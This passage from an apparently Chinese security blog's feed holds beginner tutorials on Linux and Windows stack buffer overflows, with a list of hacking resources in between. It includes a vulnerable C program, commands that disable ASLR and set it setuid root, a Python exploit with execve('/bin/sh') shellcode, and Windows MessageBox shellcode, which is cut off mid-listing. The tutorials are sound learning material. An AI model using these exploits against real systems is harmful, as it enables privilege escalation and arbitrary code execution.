rel="noopener">IDA简易教程</a><br><a href="https://www.zybuluo.com/oro-oro/note/137244" target="_blank" rel="noopener">《IDA Pro权威指南》入门笔记</a><br><a href="https://blog.csdn.net/hgy413/article/details/50594320" target="_blank" rel="noopener">IDA-XREF（交叉引用）概述</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>linux栈溢出学习笔记</title>
      <link href="/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h4 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h4><p>gdb GNU Project Debugger<br>在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是<a href="https://github.com/longld/peda" target="_blank" rel="noopener">peda</a><br>peda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等</p><ul><li>aslr – 显示和设置GDB的aslr</li><li>checksec – 显示多种安全机制的开关</li><li>dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数</li><li>dumpprop – dump所有ROP gadgets 在一定的内存范围内</li><li>elfheader – 获取被调试的ELF文件的头信息</li><li>lefsymbol –获取非调试状态下的 符号信息</li><li>lookup – 在一定地址范围内查找所有的地址以及引用</li><li>patch – Patch memory start at an address with string/hexstring/int</li><li>pattern – Generate, search, or write a cyclic pattern to memory</li><li>procinfo – 从/proc/pid/显示不同的信息</li><li>pshow – 显示peda的选项以及其它的设置</li><li>pset – 设置peda的选项以及其它的设置</li><li>readelf 获取ELF文件的头部信息</li><li>ropgadget – Get common ROP gadgets of binary or library</li><li>ropsearch – Search for ROP gadgets in memory</li><li>searchmem|find – Search for a pattern in memory; support regex search</li><li>shellcode – Generate or download common shellcodes.</li><li>skeleton – Generate python exploit code template</li><li>vmmap – Get virtual mapping address ranges of section(s) in debugged process</li><li>xormem – XOR a memory region with a key</li></ul><p>在gdb中，常用的就是如下的命令<br>attach  附加某个进程进行调试<br>run 运行程序 ，会在断点处停下来<br>break或者b  xxx ，下断点<br>next 类似于od中的单步步过<br>step 类似于od中的单步步入</p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><h2 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是缓冲区溢出</h2><ul><li>拷贝源buffer到目的buffer可以导致溢出漏洞，需要满足两个条件</li><li>1.源的string长度超过目的string的长度</li><li>2.没有对拷贝的长度做检查<h2 id="两种缓冲区溢出"><a href="#两种缓冲区溢出" class="headerlink" title="两种缓冲区溢出"></a>两种缓冲区溢出</h2></li><li>1.栈溢出-目的缓冲区是在栈中</li><li>2.堆溢出-目的缓冲区是在堆中</li><li>下面这张图展示了linux中内存的分块情况。<br><img src="/2017/08/16/linux栈溢出学习笔记/linux-memory-segment.jpg" alt=""><h2 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h2></li><li><p>缓冲区溢出可以导致任意代码执行</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><h2 id="1-漏洞示例代码"><a href="#1-漏洞示例代码" class="headerlink" title="1.漏洞示例代码"></a>1.漏洞示例代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//vuln.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">        /* [1] */ char buf[256];</span><br><span class="line">        /* [2] */ strcpy(buf,argv[1]);</span><br><span class="line">        /* [3] */ printf(&quot;Input:%s\n&quot;,buf);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>注：本次测试的是在ubuntu14.04的X86上做的测试。</p></li><li><p>在编译之前我们首先要关闭系统的ASLR 方法是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></li><li><p>编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$gcc -g -fno-stack-protector -z execstack -o vuln vuln.c //这里编译选项是关闭DEP和stack protector</span><br><span class="line">$sudo chown root vuln</span><br><span class="line">$sudo chgrp root vuln</span><br><span class="line">$sudo chmod +s vuln</span><br></pre></td></tr></table></figure></li></ul><h2 id="2-如何利用"><a href="#2-如何利用" class="headerlink" title="2.如何利用"></a>2.如何利用</h2><ul><li>任意代码执行使用的技术叫做“覆盖返回地址”，就是攻击者覆盖掉栈中的“返回地址”从而让指令寄存器转向去执行我们构造好的恶意代码。</li><li>在看漏洞的利用代码之前，为了更好的理解，让我们来看一下这段有漏洞的代码的反汇编代码。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   //Function Prologue</span><br><span class="line">   0x08048414 &lt;+0&gt;:push   ebp                      //备份调用者的ebp</span><br><span class="line">   0x08048415 &lt;+1&gt;:mov    esp,ebp                 //设置esp和ebp相同</span><br><span class="line"></span><br><span class="line">   0x08048417 &lt;+3&gt;:and    0xfffffff0,esp          //栈对齐</span><br><span class="line">   0x0804841a &lt;+6&gt;:sub    0x110,esp               //开辟栈空间</span><br><span class="line">   0x08048420 &lt;+12&gt;:mov    0xc(ebp),eax            //eax = argv</span><br><span class="line">   0x08048423 &lt;+15&gt;:add    $0x4,eax                 //eax = &amp;argv[1]</span><br><span class="line">   0x08048426 &lt;+18&gt;:mov    (eax),eax               //eax = argv[1]</span><br><span class="line">   0x08048428 &lt;+20&gt;:mov    eax,0x4(esp)            //拷贝arg2</span><br><span class="line">   0x0804842c &lt;+24&gt;:lea    0x10(esp),eax           //eax = &apos;buf&apos; </span><br><span class="line">   0x08048430 &lt;+28&gt;:mov    eax,(esp)               //拷贝 arg1</span><br><span class="line">   0x08048433 &lt;+31&gt;:call   0x8048330 &lt;strcpy@plt&gt;    //调用 strcpy</span><br><span class="line">   0x08048438 &lt;+36&gt;:mov    $0x8048530,eax           //eax = format str &quot;Input: s\n&quot;</span><br><span class="line">   0x0804843d &lt;+41&gt;:lea    0x10(esp), edx           //edx = buf</span><br><span class="line">   0x08048441 &lt;+45&gt;:mov    edx,0x4(esp)            //printf arg2</span><br><span class="line">   0x08048445 &lt;+49&gt;:mov    eax,(esp)               //printf arg1</span><br><span class="line">   0x08048448 &lt;+52&gt;:call   0x8048320 &lt;printf@plt&gt;    //调用 printf</span><br><span class="line">   0x0804844d &lt;+57&gt;:mov    $0x0,eax                 //return value 0</span><br><span class="line"></span><br><span class="line">   //收尾函数</span><br><span class="line">   0x08048452 &lt;+62&gt;:leave                            //mov ebp, esp; pop ebp; </span><br><span class="line">   0x08048453 &lt;+63&gt;:ret                              //return</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/08/16/linux栈溢出学习笔记/stackmap.png" alt=""></p><h2 id="3-测试步骤"><a href="#3-测试步骤" class="headerlink" title="3.测试步骤"></a>3.测试步骤</h2><ul><li>1.是否可以覆盖返回地址<br><img src="/2017/08/16/linux栈溢出学习笔记/test1.png" alt=""></li><li>可以看到当我们输出300个A的时候，程序EIP的指向了地址0x41414141（即我们用AAAA覆盖掉了返回地址）</li><li>2.目标buffer的偏移怎么计算</li><li>就是覆盖掉的地址换成我们恶意代码的入口地址怎么计算，他是0x10c=0x100（就是那256个字节）+0x8（对齐）+0x4（call ebp指令长度）</li><li>因此当我们输入“A”<em>268+“B”</em>4的时候，就会依次覆盖掉buf、对齐、以及call ebp，即返回地址就是“BBBB”<br><img src="/2017/08/16/linux栈溢出学习笔记/test2.png" alt=""><br>正如我们所想！如上我们就控制了返回地址，且这个地址就在0xbfffeeb0这个地址上存放着。<br><img src="/2017/08/16/linux栈溢出学习笔记/test22.png" alt=""></li><li><p>3.编写测试代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import struct</span><br><span class="line">from subprocess import call</span><br><span class="line"></span><br><span class="line">#Stack address where shellcode is copied.</span><br><span class="line">ret_addr = 0xbfffeeb0       </span><br><span class="line">              </span><br><span class="line">#Spawn a shell</span><br><span class="line">#execve(/bin/sh)</span><br><span class="line">scode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">#endianess convertion</span><br><span class="line">def conv(num):</span><br><span class="line"> return struct.pack(&quot;&lt;I&quot;,num)</span><br><span class="line">buf = &quot;A&quot; * 268</span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += &quot;\x90&quot; * 100</span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line">print &quot;Calling vulnerable program&quot;</span><br><span class="line">call([&quot;./vuln&quot;, buf])</span><br></pre></td></tr></table></figure></li><li><p>4.结果截图<br><img src="/2017/08/16/linux栈溢出学习笔记/result.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./vuln `python -c &quot;print &apos;A&apos;*268+&apos;\x80\xee\xff\xbf&apos;+&apos;\x90&apos;*100 + &apos;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&apos;&quot;`</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/08/16/linux栈溢出学习笔记/commandlineexp.png" alt=""></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul><li>这里为了测试了简单的缓冲区溢出的基本原理我们关掉了一些防护比如内存地址随机化aslr以及DEP，后面有时间再学习和分享一下绕过这些防护的方法。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="noopener">Classic Stack Based Buffer Overflow</a><br>[How to exploit a buffer overflow vulnerability - Practical]<br>(<a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=hJ8IwyhqzD4</a>)<br><a href="https://www.youtube.com/watch?v=1S0aBV-Waeo" target="_blank" rel="noopener">Buffer Overflow Attack - Computerphile</a><br><a href="https://www.youtube.com/watch?v=eYrfWpkvMxA" target="_blank" rel="noopener">Kali Linux 2016.1 - Buffer Overflow Tutorial</a><br><a href="http://blog.csdn.net/21cnbao/article/details/7385161" target="_blank" rel="noopener">Linux gdb调试器用法全面解析</a><br><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="noopener">一步一步学ROP之linux_x86篇</a><br><a href="https://exploit-exercises.com/" target="_blank" rel="noopener">linux溢出练习</a><br><a href="http://louisrli.github.io/blog/2012/06/22/nebula0/#.WnGH9pP1U0o" target="_blank" rel="noopener">Nebula Shell Exploits</a><br><a href="https://sploitfun.wordpress.com/2015/" target="_blank" rel="noopener">Linux (x86) Exploit Development Series</a><br><a href="https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/babysfirst/r0pbaby" target="_blank" rel="noopener">DEF CON CTF Quals 2015: r0pbaby</a><br><a href="http://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a><br><a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="noopener">How to exploit a buffer overflow vulnerability - Practical</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Awosome Hacking系列</title>
      <link href="/2017/08/09/Awosome-Hacking%E7%B3%BB%E5%88%97/"/>
      <url>/2017/08/09/Awosome-Hacking%E7%B3%BB%E5%88%97/</url>
      <content type="html"><![CDATA[<h4 id="About"><a href="#About" class="headerlink" title="About"></a>About</h4><p>这里推荐一下github上的一个项目<a href="https://github.com/Hack-with-Github/Awesome-Hacking" target="_blank" rel="noopener">Awesome-Hacking</a><br>安全研究方向的一些参考资源，质量还是不错的,涵盖的方面比较的广.</p><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>Android安全：收集了各种Android工具、报告/研究/书籍、漏洞/利用代码等资源</p><p>应用安全：了解学习应用程序安全的资源列表</p><p>漏洞赏金：漏洞赏金计划集合和著名赏金猎人博客列表</p><p>Cheatsheets：常见的渗透测试/安全备忘录</p><p>CTF：CTF框架、类库、资源、软件和教程清单</p><p>网络攻击环境：可以合法地锻炼培养自己攻击技能的环境集合</p><p>安全开发运维：devsecops.org社区贡献的权威devsecops工具列表</p><p>Exploit开发：学习exploit开发的资源</p><p>Fuzzing：各种fuzzing图书、课程、工具、教程和易受攻击应用集合</p><p>Hacking：Awesome Hacking资源列表</p><p>蜜罐：包括不同类型的蜜罐、蜜罐工具、蜜罐分析等</p><p>事件响应：旨在帮助安全分析师和数字取证人员</p><p>工控安全：包括工具、蜜罐、数据、警报和新闻、会议各种工控安全等</p><p>信息安全：有各种信息安全公开课、培训信息</p><p>IoT安全：聚合了大量IoT破解案例，如RFID、门铃、中控、可穿戴等</p><p>恶意软件分析：包括恶意软件收集、开源威胁情报、检测、沙箱等</p><p>开源情报：情报界的各种开源情报来源</p><p>OS X和iOS安全：OS X和iOS安全工具集合</p><p>Pcaptools：流量处理的命令集、捕获工具、分析检查、DNS配置等工具资源</p><p>渗透测试：在线渗透测试资源、Shellcode开发、开源情报资源、社会工程资源等</p><p>PHP安全：PHP生成安全随机数、加密数据、检查漏洞等类库</p><p>逆向：关于逆向的图书、培训、实战、工具等</p><p>安全演讲：收集了2013-2017年各类安全大会演讲视频</p><p>SecLists：安全测试人员进行评估检查需要用到的技能</p><p>Security：Awesome Security，一个社区驱动的知名安全资源分类集合</p><p>社会工程学：仅供网络安全人员、渗透测试人员在受控环境用于教育用途</p><p>静态分析：针对各种编程语言的静态分析工具、linters、代码质量检查等</p><p>威胁情报：包括常见威胁情报来源、格式、架构、工具、研究标准书籍等</p><p>车辆安全：关于车辆安全的学习资源、项目、软硬件、汽车黑客案例、Twitter follower列表等</p><p>漏洞研究：相对偏学术方向，有不少书籍、会议、报告等推荐</p><p>Web黑客：Web安全入门各种书籍、文档、工具</p><p>Windows漏洞利用：Windows堆栈溢出、内核攻击、内存损坏、内存保护等内容资源</p><p>WiFi兵工厂：针对802.11协议攻击的各类工具</p><h4 id="可用知识库"><a href="#可用知识库" class="headerlink" title="可用知识库"></a>可用知识库</h4><p>API安全检查清单：当你设计、测试、发布API时，需要核对的安全细节清单</p><p>APT Notes：2008年至今的所有APT行动披露报告汇总，中国出现了11次</p><p>赏金漏洞披露列表：偏Web向的常见漏洞类型案例披露</p><p>密码学：密码学的理论、工具、框架、资源等</p><p>CFT工具：CTF从入门到了解各种工具</p><p>CVE PoC库：博主从13年到现在收集的数十个CVE漏洞的PoC</p><p>取证：数字取证的常见工具资源</p><p>免费编程书：关于系统、数据库、IDE、编程语言等方面的免费书</p><p>灰帽黑客资源：CTF、加密学、Linux Hacking、USB Hacking、漏洞等</p><p>信息安全入门：包括信息安全博客、认证、课程、社区、播客、工具等</p><p>安全资源：一个类似MITRE ATT&amp;C的框架</p><p>IOC：常见IOC资源、工具</p><p>Linux内核利用库：2005年至今的Linux内核利用技术演讲、漏洞、Writeups等</p><p>网络安全领域的机器学习：相关研究的数据集、论文、书籍、演讲等</p><p>恶意软件脚本：博主收集的二十几个脚本</p><p>Payloads：一大波常见Web攻击Payloads</p><p>Payloads集合：比上面这个更丰富的常见Web攻击Payloads</p><p>五星级Cheatsheets：包括OS X命令行、PowerShell命令行、Google Dorks、Shodan、exploit开发、Java反序列化等最全备忘</p><p>Pentest Wiki：博主收集的在线安全知识库，里边涵盖网络分析、Web应用、开源情报、漏洞分析、编程开发等多个领域</p><p>字典：作者自称找了超过80GB密码库，从中总结出这个字典项目</p><p>Resource List：零碎的GitHub安全项目汇总，涉及PWND、PowerShell、CTF、恶意软件等</p><p>逆向工程：常见软件、类库、书籍、技术分析、开发等</p><p>RF安全工具箱：国人@cn0xroot 聚合的各类射频资源集合，包括SDR、GSM、3G、4G LTE、NFC&amp;RFID、ZigBee等</p><p>安全备忘录：收集了许多信息安全工具和主题</p><p>安全清单：一大波详实的全系列安全资源</p><p>Shell：一系列Shell命令行、工具、指南等</p><p>威胁猎人攻略：帮助安全分析师利用Sysmon和Windows Events日志来进行事件分析，涉及Splunk、ELK、Sigma、GrayLog等工具</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>windows栈溢出入门</title>
      <link href="/2017/08/02/windows%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8/"/>
      <url>/2017/08/02/windows%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h4 id="概念知识点"><a href="#概念知识点" class="headerlink" title="概念知识点"></a>概念知识点</h4><ul><li>在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方<br>1.数据在指令中直接给出<br>2.数据在寄存器中<br>3.数据在内存中<h4 id="漏洞利用原理简介"><a href="#漏洞利用原理简介" class="headerlink" title="漏洞利用原理简介"></a>漏洞利用原理简介</h4>本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellcode的地址，那么shellcode本来是作为数据的结果被当做指令给执行了。感觉其实和sql注入啊，xss啥的都差不多，都是”数据”被当做代码或者指令给执行了 :)<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char buffer[8];</span><br><span class="line">LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">strcpy(buffer,name);</span><br><span class="line">printf(&quot;%s\n&quot;,buffer);</span><br><span class="line">getchar();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>主要是利用strcpy函数的复制，当name的内容大于buffer的大小时候，这个时候会产生异常，Exception code: C0000005 ACCESS_VIOLATION。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用栈溢出弹出一个MessageBox的框</p><h4 id="辅助工具代码"><a href="#辅助工具代码" class="headerlink" title="辅助工具代码"></a>辅助工具代码</h4><p>以下代码用于定位user32.dll中的MessageBox以及kernel32.dll中的ExitProcess地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">typedef void (*MYPROC)(LPTSTR);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">HINSTANCE LibHandle;</span><br><span class="line">MYPROC ProcAdd;</span><br><span class="line">LibHandle = LoadLibrary(&quot;kernel32&quot;);</span><br><span class="line">//LibHandle = LoadLibrary(&quot;user32&quot;);</span><br><span class="line">printf(&quot;kernel LibHandle = //x%x\n&quot;,LibHandle);</span><br><span class="line">ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;ExitProcess&quot;);</span><br><span class="line">//ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;);</span><br><span class="line">printf(&quot;system = //x%x\n&quot;,ProcAdd);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以下代码用于发现user32.dll(当然其它dll中也存在jmp esp操作码的地址)中jmp esp的操作码的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line">#include &quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">BYTE *ptr;</span><br><span class="line">int position;</span><br><span class="line">HINSTANCE handle;</span><br><span class="line">BOOL done_flag = FALSE;</span><br><span class="line">handle = LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">if(!handle)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;Load dll error&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">ptr = (BYTE*)handle;</span><br><span class="line"></span><br><span class="line">for(position = 0; !done_flag; position++ )</span><br><span class="line">&#123;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4)</span><br><span class="line">&#123;</span><br><span class="line">int address = (int)ptr + position;</span><br><span class="line">printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">catch(...)</span><br><span class="line">&#123;</span><br><span class="line">int address = (int)ptr + position;</span><br><span class="line">printf(&quot;END OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">done_flag = true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="汇编利用代码实现"><a href="#汇编利用代码实现" class="headerlink" title="汇编利用代码实现"></a>汇编利用代码实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">_asm&#123;</span><br><span class="line">sub esp,0x50</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push 0x20676e69</span><br><span class="line">push 0x6e726157  //push &quot;Warning&quot;</span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx</span><br><span class="line">push 0x20202021    //push &quot;you have been hacked by M0rk!&quot;</span><br><span class="line">push 0x6b72304d</span><br><span class="line">push 0x20796220</span><br><span class="line">push 0x64656b63</span><br><span class="line">push 0x6168206e</span><br><span class="line">push 0x65656220</span><br><span class="line">push 0x65766168</span><br><span class="line">push 0x20756f79</span><br><span class="line">mov ecx,esp</span><br><span class="line"></span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov eax,0x761aea99</span><br><span class="line">call eax</span><br><span class="line">push ebx</span><br><span class="line">mov eax,0x7700be52</span><br><span class="line">        call eax</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>通过ollydbg或者<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VisualStudio%E7%94%9F%E6%88%90shellcode/" target="_blank" rel="noopener">vs</a>查看机器码<br>或者<a href="http://brieflyx.me/2015/linux-tools/msfvenom-intro/" target="_blank" rel="noopener">msf</a>生成<br>机器码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">83EC 50</span><br><span class="line">33DB</span><br><span class="line">53</span><br><span class="line">68 696E6720</span><br><span class="line">68 5761726E</span><br><span class="line">8BC4</span><br><span class="line">53</span><br><span class="line">68 21202020</span><br><span class="line">68 4D30726B</span><br><span class="line">68 20627920</span><br><span class="line">68 636B6564</span><br><span class="line">68 6E206861</span><br><span class="line">68 20626565</span><br><span class="line">68 68617665</span><br><span class="line">68 796F7520</span><br><span class="line">8BCC</span><br><span class="line">53</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">53</span><br><span class="line">B8 99EA1A76</span><br><span class="line">FFD0</span><br><span class="line">53</span><br><span class="line">B8 52BE0077</span><br><span class="line">FFD0</span><br></pre></td></tr></table></figure></p><p>所以对应的shellcode是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x83\xEC\x50&quot;</span><br><span class="line">  &quot;\x33\xDB&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\x68\x69\x6E\x67\x20&quot;</span><br><span class="line">  &quot;\x68\x57\x61\x72\x6E&quot;</span><br><span class="line">  &quot;\x8B\xC4&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\x68\x21\x20\x20\x20&quot;</span><br><span class="line">  &quot;\x68\x4D\x30\x72\x6B&quot;</span><br><span class="line">  